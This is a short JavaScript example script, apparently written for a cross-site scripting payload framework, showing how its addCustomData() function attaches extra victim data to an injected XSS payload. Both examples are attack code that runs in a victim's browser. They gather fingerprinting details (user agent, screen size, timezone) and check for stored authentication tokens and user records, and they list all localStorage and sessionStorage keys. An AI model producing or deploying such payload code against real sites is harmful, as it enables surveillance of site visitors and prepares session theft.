// Name: Simple Custom Data Example
// Description: Basic example showing how to use addCustomData() to send custom information with the initial XSS payload

// Example 1: Send basic user information
window.addCustomData({
  title: "User Information",
  data: {
    userAgent: navigator.userAgent,
    screenResolution: screen.width + 'x' + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString()
  }
});

// Example 2: Check for specific localStorage keys
window.addCustomData({
  title: "Storage Check",
  data: {
    hasAuthToken: localStorage.getItem('token') !== null,
    hasUserData: localStorage.getItem('user') !== null,
    localStorageKeys: Object.keys(localStorage),
    sessionStorageKeys: Object.keys(sessionStorage)
  }
});